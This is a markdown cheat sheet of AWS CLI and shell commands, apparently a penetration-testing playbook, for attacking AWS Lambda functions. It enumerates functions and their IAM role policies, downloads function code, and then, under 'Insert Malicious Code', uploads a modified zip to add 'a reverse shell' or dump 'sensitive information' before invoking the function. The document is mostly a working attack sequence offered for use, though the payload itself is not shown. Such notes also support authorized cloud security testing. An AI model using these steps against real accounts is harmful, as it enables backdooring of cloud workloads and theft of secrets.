# Lambda

### 1) Get function with URL

    aws lambda get-function --function-name arn:aws:lambda:REGION:AWS_ACCOUNT_ID:function:sample-lambda

### 2) Download

    curl "https://GENERATED_URL_FROM_PREVIOUS_COMMAND" --output lambda.zip

### 3) Unzip contents

    unzip lambda.zip

## Enumeration

### 1) Enumerate Lambda functions

    aws lambda list-functions

### 2) Enumerate policies attached to each function

    FUNCTIONS="LAMBDA_FUNCTION_NAME NAME_2"
    
    for f in $FUNCTIONS ; do
        ROLE=`aws lambda get-function --function-name $f --query Configuration.Role --output text | awk -F\/ '{print $NF}'`
        echo "$f has $ROLE with these managed policies:"
        aws iam list-attached-role-policies --role-name $ROLE
        for p in `aws iam list-role-policies  --role-name $ROLE --query PolicyNames --output text` ; do
            echo "$ROLE for $f has inline policy $p:"
            aws iam get-role-policy --role-name $ROLE --policy-name $p
        done
    done

### 3) Download function code for analysis

    FUNCTIONS="LAMBDA_FUNCTION_NAME_1 NAME_2"
    for f in $FUNCTIONS ; do
        URL=`aws lambda get-function --function-name $f --query Code.Location --output text`
        curl -s $URL -o $f.zip
        mkdir $f
        unzip $f.zip -d $f
    done

### 4) Create a new zip file to ready it for upload after modification

    zip -r ../compromised.zip index.py

## Insert Malicious Code

Prerequisites: AWS Credentials that have the permissions to do so.

### 1) Check policies in the Lambda function

    aws lambda get-policy --query Policy --output text --function-name arn:aws:lambda:REGION:AWS_ACCOUNT_ID:function:sample-function

#### Interesting findings:

- lambda:UpdateFunctionCode

- lambda:*

### 2) Modify the function with a reverse shell, or print sensitive information.

    aws lambda update-function-code --function-name FUNCTION_NAME --zip-file file://malicious.zip

### 3) Invoke function

    aws lambda invoke --function-name FUNCTION_NAME output.txt
